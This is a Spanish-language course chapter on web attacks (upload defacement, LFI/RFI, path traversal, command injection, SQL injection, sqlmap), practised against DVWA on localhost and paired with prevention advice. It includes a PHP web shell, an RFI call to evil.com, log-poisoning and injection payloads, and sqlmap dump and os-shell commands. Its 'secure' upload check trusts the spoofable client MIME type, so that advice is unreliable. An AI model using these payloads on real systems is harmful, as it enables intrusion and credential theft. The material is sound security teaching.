    image: vulnerables/web-dvwa
    ports:
      - "8080:80"
    restart: always
```

#### Iniciar el entorno:

```bash
docker compose up -d
```

Luego accede a:
📲 [http://localhost:8080](http://localhost:8080)
Usuario: `admin`
Contraseña: `password`

Configura DVWA en modo **"Low"** desde el menú "DVWA Security".

---

### ⚠️ Explicación paso a paso del ataque Defacement

Supongamos que tienes una página que permite subir imágenes de perfil. La validación del backend **solo revisa que el archivo tenga la extensión `.jpg`** pero **no verifica su contenido real** ni **limita el tipo MIME**.

---

#### 🎯 Paso 1: Crear una web shell maliciosa

```php
<?php
  echo "Hola, soy Gustavo y hackeé este sitio 😈";
  file_put_contents("index.html", "<h1>DEFACED BY GUSTAVO</h1>");
?>
```

Guárdalo como: `gus.php.jpg`

💡 Este archivo tiene una extensión `.jpg`, pero contiene código PHP.

---

#### 🎯 Paso 2: Subir el archivo al servidor vulnerable

- En DVWA, ve a la sección **"Upload"**
- Selecciona el archivo `gus.php.jpg`
- Haz clic en "Upload"

El archivo se guarda en `/hackable/uploads/` (puedes ver la URL del archivo subido).

---

#### 🎯 Paso 3: Ejecutar la shell

- Accede a:

```
http://localhost:8080/hackable/uploads/gus.php.jpg
```

- Si el servidor interpreta el código PHP, verás:

```
Hola, soy Gustavo y hackeé este sitio 😈
```

Además, creará un archivo `index.html` con el mensaje de **DEFACEMENT**.

---

### 🔓 ¿Por qué ocurre esta vulnerabilidad?

1. **No se validó el tipo MIME** del archivo.
2. **No se restringió la ejecución de scripts en la carpeta de uploads**.
3. **No se cambió el nombre del archivo subido** (riesgo de sobrescribir archivos existentes).
4. **No se usaron listas blancas** de extensiones permitidas.

---

### 🛡️ Cómo prevenir este ataque

| Protección                    | Ejemplo                                     |
| ----------------------------- | ------------------------------------------- |
| Verificar tipo MIME real      | Usar `fileinfo` en PHP o `mimetype` en Node |
| Renombrar archivos subidos    | Generar nombre único aleatorio              |
| Bloquear ejecución en carpeta | Deshabilitar `php` en `/uploads`            |
| Lista blanca de extensiones   | Solo permitir `.jpg`, `.png`, etc.          |
| Validación del contenido real | Revisar cabecera de archivo                 |

---

### ✅ Ejemplo completo resumido

1. **Archivo malicioso**: `gus.php.jpg` con código PHP
2. **Subido en entorno vulnerable (DVWA en modo Low)**
3. **Acceso al archivo**: `http://localhost:8080/hackable/uploads/gus.php.jpg`
4. **Ejecución del código malicioso** genera **defacement**
5. **Archivo `index.html` es sobrescrito con el mensaje de Gustavo**

---

### 🎁 Bonus: Validación correcta del lado del servidor (PHP)

```php
$allowed = ['image/jpeg', 'image/png'];
if (in_array($_FILES['archivo']['type'], $allowed)) {
    move_uploaded_file($_FILES['archivo']['tmp_name'], 'uploads/' . uniqid() . '.jpg');
} else {
    echo "Tipo de archivo no permitido";
}
```

---

[🔼](#índice)

---

## **1002. Técnicas de File Inclusion: Local y Remote**

### 📂 Técnicas de File Inclusion (Inyección de Archivos)

#### ¿Qué es?

**File Inclusion** es una vulnerabilidad que ocurre cuando una aplicación web **incluye archivos sin validación adecuada**, permitiendo que un atacante inyecte o ejecute código malicioso.

Hay dos tipos:

| Tipo                               | Descripción                                                         |
| ---------------------------------- | ------------------------------------------------------------------- |
| ✅ **LFI (Local File Inclusion)**  | Se incluye un archivo **local del servidor**.                       |
| 🌐 **RFI (Remote File Inclusion)** | Se incluye un archivo alojado en un **servidor remoto (exterior)**. |

---

### 🎯 ¿Qué se puede lograr?

- **Leer archivos del sistema** como `/etc/passwd` (LFI)
- **Ejecutar código PHP remoto** desde otra URL (RFI)
- **Escalar privilegios** o **tomar el control** del servidor

---

### 🔧 Cómo instalar un entorno vulnerable para probar LFI y RFI

Vamos a usar **DVWA (Damn Vulnerable Web Application)**. Este entorno trae un ejemplo vulnerable a File Inclusion.

---

### 🐳 Instalación con Docker (recomendado)

#### 1. Requisitos:

- Docker y Docker Compose instalados

#### 2. Instalar DVWA

```bash
git clone https://github.com/digininja/DVWA.git
cd DVWA
```

#### 3. Crear el archivo `docker-compose.yml`:

```yaml
version: "3"
services:
  dvwa:
    image: vulnerables/web-dvwa
    ports:
      - "8080:80"
    restart: always
```

```bash
docker compose up -d
```

Accede a: [http://localhost:8080](http://localhost:8080)
Usuario: `admin` | Contraseña: `password`

---

### 📘 Ejemplo de LFI (Local File Inclusion)

Supón que tienes esta URL vulnerable:

```
http://localhost:8080/vulnerabilities/fi/?page=home.php
```

La aplicación está incluyendo archivos locales como este:

```php
<?php
    include($_GET['page']);
?>
```

#### ✅ Paso 1: Exploitar LFI para leer archivos del sistema

Cambia la URL a:

```
http://localhost:8080/vulnerabilities/fi/?page=../../../../etc/passwd
```

**Resultado:** verás el contenido del archivo `/etc/passwd`

Esto es posible porque el servidor **no validó ni restringió** qué archivos se podían incluir.

---

### 🌐 Ejemplo de RFI (Remote File Inclusion)

Esto es posible si el servidor permite incluir archivos remotos con `allow_url_include = On` en `php.ini`.

Supón que controlas un servidor remoto con un archivo PHP:

```php
<?php system($_GET['cmd']); ?>
```

Y está en:

```
http://evil.com/shell.txt
```

#### ✅ Paso 1: Exploitar RFI

Cambia la URL de la víctima a:

```
http://localhost:8080/vulnerabilities/fi/?page=http://evil.com/shell.txt&cmd=id
```

**Resultado:** ejecutará el comando `id` en el servidor víctima 😈

---

### 🔍 ¿Cómo detectar si es vulnerable?

1. Inyecta `../` en el parámetro de la URL
2. Intenta cargar archivos conocidos:

   - `/etc/passwd` en Linux
   - `C:\Windows\win.ini` en Windows

3. Si ves contenido inesperado en la respuesta: **es vulnerable a LFI**
4. Si puedes ejecutar comandos desde una URL remota: **es vulnerable a RFI**

---

### 🛡️ ¿Cómo prevenir?

| Defensa                                    | Descripción                                     |
| ------------------------------------------ | ----------------------------------------------- |
| ✅ Validar y sanitizar entrada del usuario | No permitir rutas arbitrarias o externas        |
| ✅ Usar rutas absolutas o listas blancas   | Solo permitir incluir archivos esperados        |
| ✅ Desactivar `allow_url_include`          | En `php.ini`: `allow_url_include = Off`         |
| ✅ Escapar los datos                       | Usar funciones como `realpath()` o `basename()` |

---

### 🧪 Ejemplo completo (práctica en DVWA)

#### 1. Abre DVWA en modo "Low"

[http://localhost:8080/vulnerabilities/fi/](http://localhost:8080/vulnerabilities/fi/)

#### 2. Inyecta LFI

```
?page=../../../../etc/passwd
```

Y verás el archivo sensible del servidor.

---

### 💡 Bonus: Exploit para obtener una reverse shell (LFI + Log Poisoning)

1. Envía una **petición maliciosa al servidor** con PHP embebido en el `User-Agent`:

```
User-Agent: <?php system($_GET['cmd']); ?>
```

2. Luego explota LFI accediendo al archivo de logs del servidor:

```
http://localhost:8080/vulnerabilities/fi/?page=/var/log/apache2/access.log&cmd=whoami
```

🔥 ¡Ejecutas comandos directamente desde los logs!

---

[🔼](#índice)

---

## **1003. Full Path Disclosure y Directory Traversa**

### 🧩 ¿Qué es Full Path Disclosure (FPD)?

#### ✅ Definición:

**Full Path Disclosure** ocurre cuando una aplicación web **revela la ruta completa del sistema de archivos del servidor** (por ejemplo, `/var/www/html/index.php`) en un mensaje de error o en la respuesta.

---

#### 💥 ¿Por qué es un problema?

El atacante puede:

- Saber cómo está estructurado el sistema del servidor
- Descubrir el sistema operativo o framework
- Usar la información en **LFI, RFI, RCE o Directory Traversal**

---

#### 🔍 Ejemplo real:

URL:

```
http://localhost/index.php?page=home
```

Si `home` no existe y no hay control de errores, puedes ver algo como:

```
Warning: include(home): failed to open stream: No such file or directory in /var/www/html/index.php on line 12
```

Esto revela: `Ruta completa del archivo: /var/www/html/index.php`

---

#### ✅ Cómo instalar entorno vulnerable (con DVWA)

```bash
git clone https://github.com/digininja/DVWA.git
cd DVWA
docker compose up -d
```

- Visita: [http://localhost:8080](http://localhost:8080)
- Usuario: `admin`, Contraseña: `password`

Luego ve a la sección **"File Inclusion"** o **"File Upload"**, ahí puedes provocar errores que revelan rutas.

---

### 📁 ¿Qué es Directory Traversal?

#### ✅ Definición:

Directory Traversal (también llamado **Path Traversal**) es una vulnerabilidad que permite a un atacante **navegar fuera del directorio raíz de la aplicación web** usando rutas relativas (`../`), y acceder a archivos **sensibles** del sistema.

---

#### 🧠 ¿Cómo funciona?

Un atacante manipula rutas como:

```
http://localhost/view.php?file=../../../etc/passwd
```

Si la aplicación hace esto:

```php
<?php include($_GET['file']); ?>
```

Y no valida bien, puedes leer cualquier archivo.

---

#### 🧪 Ejemplo vulnerable:

Supón que tienes esta URL:

```
http://localhost/index.php?page=home.php
```

Si cambias `home.php` por `../../../etc/passwd`, verás el contenido del archivo del sistema.

**Salida:**

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

---

### 🧰 Instalación del entorno de prueba (Directory Traversal)

Puedes usar **DVWA** o un script básico en PHP:

#### `vuln.php`

```php
<?php
$page = $_GET['page'];
include($page);
?>
```

Ejecuta un servidor:

```bash
php -S localhost:8080
```

Prueba esto en tu navegador:

```
http://localhost:8080/vuln.php?page=../../../etc/passwd
```

---

### 🎯 Ejemplo Completo: FPD + Directory Traversal

1. **El atacante encuentra una URL vulnerable**:

```
http://victima.com/vuln.php?page=contact.php
```

2. **Prueba una ruta incorrecta**:

```
http://victima.com/vuln.php?page=contactx.php
```

Y ve el error:

```
Warning: include(contactx.php): failed to open stream: No such file or directory in /var/www/html/vuln.php
```

👉 Esto es un **Full Path Disclosure**

---

3. **Luego explota Directory Traversal**:

```
http://victima.com/vuln.php?page=../../../../etc/passwd
```

🔥 Y obtiene el contenido del archivo.

---

### 🛡️ Cómo prevenir FPD y Directory Traversal

| Medida                          | Descripción                                                                |
| ------------------------------- | -------------------------------------------------------------------------- |
| ✅ Desactiva mensajes de error  | Usa `display_errors = Off` en `php.ini`                                    |
| ✅ Usa rutas absolutas seguras  | No uses `include($_GET['param'])` sin validación                           |
| ✅ Usa listas blancas           | Solo permite archivos conocidos: `if($page == 'home') include('home.php')` |
| ✅ Escapa caracteres especiales | Sanitiza `../`, `..%2F`, etc.                                              |

---

[🔼](#índice)

---

## **1004. Command Injection**

### 🧨 ¿Qué es Command Injection?

**Command Injection** es una vulnerabilidad que permite a un atacante **ejecutar comandos del sistema operativo** en un servidor vulnerable a través de una aplicación web. Esto sucede cuando una aplicación pasa entradas del usuario directamente a una función del sistema (como `system()`, `exec()`, `popen()`, etc.) **sin validación adecuada**.

---

#### 📌 Diferencia con otros ataques

- En **SQL Injection**, se inyectan comandos a una base de datos.
- En **Command Injection**, se inyectan comandos al sistema operativo, como `ls`, `whoami`, `cat`, `net user`, etc.

---

### 🎯 ¿Qué puede lograr un atacante?

- Obtener información del sistema (`whoami`, `uname -a`)
- Leer archivos sensibles (`cat /etc/passwd`)
- Crear usuarios maliciosos
- Descargar malware
- Escalar privilegios

---

### 👨‍🏫 Ejemplo simple:

Supongamos que tienes una aplicación con un formulario que recibe una IP y hace ping:

```php
<?php
$ip = $_GET['ip'];
echo shell_exec("ping -c 1 " . $ip);
?>
```

Si ingresas:

```
127.0.0.1
```

El servidor ejecuta:

```
ping -c 1 127.0.0.1
```

Pero si ingresas:

```
127.0.0.1; whoami
```

El servidor ejecuta:

```
ping -c 1 127.0.0.1; whoami
```

Y devuelve, por ejemplo:

```
www-data
```

➡️ ¡Has ejecutado un comando en el servidor!

---

### 🧪 Cómo instalar un entorno vulnerable

#### Opción 1: Usar DVWA (Damn Vulnerable Web Application)

```bash
git clone https://github.com/digininja/DVWA.git
cd DVWA
docker compose up -d
```

Accede a: `http://localhost:8080`
Usuario: `admin`
Contraseña: `password`

Ve a la sección: **Command Injection**
Ahí puedes probar inyecciones como:

```
127.0.0.1; whoami
```

---

#### Opción 2: Crear un archivo PHP vulnerable

1. Crea un archivo llamado `vuln.php`:

```php
<?php
if (isset($_GET['ip'])) {
    $ip = $_GET['ip'];
    $output = shell_exec("ping -c 1 " . $ip);
    echo "<pre>$output</pre>";
}
?>
```

2. Ejecuta un servidor:

```bash
php -S localhost:8080
```

3. Accede a:

```
http://localhost:8080/vuln.php?ip=127.0.0.1;whoami
```

Resultado:

```
PING 127.0.0.1 ...
www-data
```

---

### ⚔️ ¿Cómo protegerse?

| Medida                          | Explicación                                                              |
| ------------------------------- | ------------------------------------------------------------------------ |
| ✅ Escapar comandos             | Usa funciones seguras como `escapeshellarg()` o `escapeshellcmd()`       |
| ✅ Evitar funciones peligrosas  | No usar `exec()`, `system()`, `shell_exec()` si no es necesario          |
| ✅ Validar y sanitizar entradas | Aceptar solo lo necesario (por ejemplo, solo números para IPs)           |
| ✅ Aplicar lista blanca         | Permitir solo comandos o valores predefinidos                            |
| ✅ Usar entornos restringidos   | Ejecutar apps web con usuarios sin privilegios y bajo control de sandbox |

---

### 🧠 Ejemplo completo de explotación

#### 1. Aplicación vulnerable:

```php
<?php
if (isset($_GET['host'])) {
    $host = $_GET['host'];
    echo shell_exec("ping -c 1 " . $host);
}
?>
```

#### 2. Ataque:

URL:

```
http://localhost:8080/vuln.php?host=127.0.0.1;whoami
```

#### 3. Resultado:

```bash
PING 127.0.0.1 ...

www-data
```

➡️ El atacante ahora sabe qué usuario ejecuta el servidor web.

---

### 🧰 Herramientas para automatizar pruebas

- **Burp Suite** → Puedes interceptar el parámetro vulnerable y probar con payloads como:

  - `127.0.0.1; id`
  - `127.0.0.1 && uname -a`

- **Commix** (herramienta automática para Command Injection)

#### Cómo instalar Commix:

```bash
git clone https://github.com/commixproject/commix.git
cd commix
python3 commix.py --url="http://localhost:8080/vuln.php?host=127.0.0.1"
```

Commix probará automáticamente diferentes inyecciones y te dará una shell si tiene éxito.

---

### 🧪 Payloads comunes

| Payload             | Qué hace                    |                             |
| ------------------- | --------------------------- | --------------------------- |
| `; whoami`          | Muestra el usuario actual   |                             |
| `&& uname -a`       | Muestra info del sistema    |                             |
| \`                  | ls /\`                      | Lista el contenido del raíz |
| `; cat /etc/passwd` | Muestra archivo de usuarios |                             |

---

[🔼](#índice)

---

## **1005. SQL Injection Manual**

### 🧠 ¿Qué es SQL Injection Manual?

**SQL Injection Manual** es una técnica usada para explotar vulnerabilidades en aplicaciones web que **no filtran correctamente los datos enviados por el usuario a una base de datos**. Esto permite inyectar comandos SQL directamente, sin automatización ni herramientas, solo usando el navegador o Burp Suite.

---

### 🧨 ¿Qué se puede lograr?

- **Bypass de login**
- Ver nombres de tablas y columnas
- Leer información sensible (usuarios, contraseñas, correos)
- Escribir, actualizar o borrar datos
- Incluso tomar control del sistema si hay funciones peligrosas habilitadas

---

### 📌 Diferencias: Manual vs Automatizado

| Tipo           | Herramientas              | Control        | Aprendizaje                |
| -------------- | ------------------------- | -------------- | -------------------------- |
| **Manual**     | Ninguna (navegador, Burp) | Máximo control | 🧠 Aprendes a fondo        |
| **Automático** | sqlmap, Havij             | Muy rápido     | 🚀 Rápido, menos educativo |

---

### 🧪 Cómo instalar un entorno vulnerable

Vamos a usar **DVWA (Damn Vulnerable Web Application)**. Puedes hacerlo con Docker:

#### 🔧 Paso 1: Clona DVWA y ejecuta con Docker

```bash
git clone https://github.com/digininja/DVWA.git
cd DVWA
docker compose up -d
```

Esto levanta Apache, MySQL y DVWA en `http://localhost:80`

---

#### 🔐 Paso 2: Accede

- Navegador: `http://localhost:80`
- Usuario: `admin`
- Contraseña: `password`
- Ir a: **DVWA Security** > Modo: `Low` (para hacerlo vulnerable)
- Ir a: **SQL Injection**

---

### 👨‍💻 Ejemplo Manual Paso a Paso

Supón que hay un campo de búsqueda de usuario, y la URL que genera es esta:

```
http://localhost/vulnerable.php?id=1
```

El código del servidor puede ser:

```php
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = '$id'";
```

Si tú escribes en la URL:

```
?id=1
```

El servidor ejecuta:

```sql
SELECT * FROM users WHERE id = '1';
```

Pero si haces:

```
?id=1' OR '1'='1
```

El servidor ejecuta:

```sql
SELECT * FROM users WHERE id = '1' OR '1'='1';
```

🔐 Eso **siempre será verdadero**, así que devuelve todos los usuarios. ¡Éxito!

---

### 🧪 Fases del SQL Injection Manual

#### 1. **Descubrir la vulnerabilidad**

Prueba en el parámetro con comillas `'`:

```
?id=1'
```

Si da error como:

```
You have an error in your SQL syntax
```

👉 Está vulnerable.

---

#### 2. **Bypass de login**

Formulario de login vulnerable:

```sql
SELECT * FROM users WHERE username = '$user' AND password = '$pass';
```

Ingresa:

- Usuario: `' OR '1'='1`
- Contraseña: `' OR '1'='1`

Se convierte en:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1';
```

🔓 ¡Acceso sin saber la contraseña!

---

#### 3. **Enumeración de columnas y tablas**

##### Obtener número de columnas

Usamos:

```
ORDER BY n
```

Ejemplo:

```
?id=1 ORDER BY 1--
?id=1 ORDER BY 2--
?id=1 ORDER BY 3--
```

Cuando dé error, el número anterior es el total de columnas.

---

##### Obtener datos visibles con UNION

```
?id=-1 UNION SELECT 1,2--
```

Muestra los números `1` y `2` en pantalla si hay dos columnas.

---

#### 4. **Extraer información**

Digamos que ya sabes que hay dos columnas visibles. Puedes hacer:

```
?id=-1 UNION SELECT username, password FROM users--
```

💥 Esto mostrará todos los usuarios y contraseñas.

---

### 🔒 Cómo prevenir SQL Injection

✅ Siempre usar **sentencias preparadas (prepared statements)**

✅ Escapar caracteres especiales

✅ Validar el tipo y contenido de los inputs

✅ No mostrar errores de SQL en producción

✅ Uso de ORM (Eloquent, Sequelize, etc.)

---

### 🎯 Ejemplo Completo Paso a Paso

#### Entorno:

- DVWA
- Modo: Low

#### Paso 1: URL vulnerable

```
http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit
```

#### Paso 2: Detectar vulnerabilidad

Agrega `'` al final:

```
?id=1'
```

➡️ Error SQL = vulnerable ✅

---

#### Paso 3: Ver columnas disponibles

```
?id=-1 UNION SELECT 1,2--
```

➡️ Aparecen `1` y `2`, entonces puedes usar esas posiciones.

---

#### Paso 4: Ver usuarios

```
?id=-1 UNION SELECT user, password FROM users--
```

➡️ Verás todos los usuarios y sus hashes de contraseña.

---

### 🛠️ Herramientas recomendadas para practicar

- **Burp Suite** → Para interceptar y modificar solicitudes
- **sqlmap** → Para automatizar
- **DVWA** y **bWAPP** → Entornos vulnerables
- **TryHackMe** / **Hack The Box** → Laboratorios prácticos

---

[🔼](#índice)

---

## **1006. SQL Injection Automatizada con SQLMap**

### 🧠 ¿Qué es SQLMap?

**sqlmap** es una herramienta de código abierto usada para detectar y explotar vulnerabilidades de SQL Injection en aplicaciones web. Lo hace de forma automática y con gran precisión.

✅ Puede:

- Detectar inyecciones SQL (booleanas, error-based, union, time-based, etc.)
- Extraer nombres de bases de datos, tablas y columnas
- Descargar contraseñas y hashes
- Leer y escribir archivos en el servidor
- Ejecutar comandos (si es posible)

---

### 🧱 ¿Cuándo se usa?

- Cuando identificaste un parámetro vulnerable manualmente
- Cuando quieres ahorrar tiempo automatizando la explotación
- En auditorías éticas y pruebas de seguridad de aplicaciones web

---

### 🔧 Instalación de sqlmap

#### Opción 1: En Kali Linux (ya viene instalado)

```bash
sqlmap --version
```

Si ya está, verás algo como:

```
1.7.3.0#dev
```

---

#### Opción 2: Instalar en Linux (Debian/Ubuntu)

```bash
sudo apt update
sudo apt install sqlmap
```

---

#### Opción 3: Usar desde GitHub (si no tienes Kali)

```bash
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python3 sqlmap.py --version
```

---

### ⚙️ Requisitos para probar

Puedes usar un entorno vulnerable como:

#### Opción 1: DVWA (Damn Vulnerable Web App)

```bash
git clone https://github.com/digininja/DVWA.git
cd DVWA
docker compose up -d
```

- Accede a: `http://localhost`
- Usuario: `admin`
- Contraseña: `password`
- Cambia la seguridad a **Low**
- Ir a la sección: `SQL Injection`

---

### 🚀 Ejemplo Real: sqlmap contra DVWA

Supón que tienes la siguiente URL vulnerable:

```
http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit
```

Ahora, vamos a usar **sqlmap** para automatizar el proceso.

---

#### ✅ Paso 1: Detectar inyección

```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxxxxx; security=low" --batch
```

🧠 Explicación:

- `-u` → URL del parámetro vulnerable
- `--cookie` → Pasamos cookies de sesión (necesario si hay login)
- `--batch` → Ejecuta sin pedir confirmación

---

#### ✅ Paso 2: Obtener la base de datos

```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxxxxx; security=low" --dbs
```

➡️ Muestra todas las bases de datos.

---

#### ✅ Paso 3: Seleccionar una base de datos y ver sus tablas

```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxxxxx; security=low" -D dvwa --tables
```

➡️ Muestra las tablas dentro de la base `dvwa`.

---

#### ✅ Paso 4: Ver las columnas de una tabla

```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxxxxx; security=low" -D dvwa -T users --columns
```

---

#### ✅ Paso 5: Extraer datos

```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxxxxx; security=low" -D dvwa -T users -C user,password --dump
```

📥 Esto descarga los nombres de usuario y contraseñas (hashes).

---

### 🧪 Ejemplo completo paso a paso

#### 1. Inicias DVWA y haces login

→ Guarda tus cookies (usa Burp o el navegador con extensiones como EditThisCookie)

#### 2. Prueba en terminal

```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=abcdef12345; security=low" --dbs
```

Resultado:

```
[*] dvwa
[*] information_schema
```

#### 3. Extrae las tablas de `dvwa`

```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=abcdef12345; security=low" -D dvwa --tables
```

Resultado:

```
[*] guestbook
[*] users
```

#### 4. Extrae los datos de `users`

```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=abcdef12345; security=low" -D dvwa -T users -C user,password --dump
```

Resultado:

```
user      | password
------------------------------
admin     | 5f4dcc3b5aa765d61d8327deb882cf99
```

(`5f4dcc3b5aa765d61d8327deb882cf99` es el hash de `password`)

---

### 🔒 ¿Cómo se protege una aplicación?

- Usar **sentencias preparadas (Prepared Statements)**
- Nunca construir SQL directamente con `+` o variables crudas
- Validar y sanitizar entradas
- No mostrar errores SQL al usuario
- Configurar correctamente los permisos de la base de datos

---

### 🧠 Consejos finales

✅ **Siempre prueba primero manualmente** (con `'`, `OR 1=1`, etc.)

✅ Usa `--level=5` y `--risk=3` para análisis más agresivos

✅ `--os-shell` o `--file-write` si sospechas que hay RCE

---

[🔼](#índice)

---

| **Inicio**         | **atrás 18**                                    | **Siguiente 20**                                                                 |
| ------------------ | ----------------------------------------------- | -------------------------------------------------------------------------------- |
| [🏠](../README.md) | [⏪](./7_18_Hacking_Escalada_de_Privilegios.md) | [⏩](./7_20_Introduccion_a_Ciberseguridad_Prevencion_de_Ataques_Informaticos.md) |
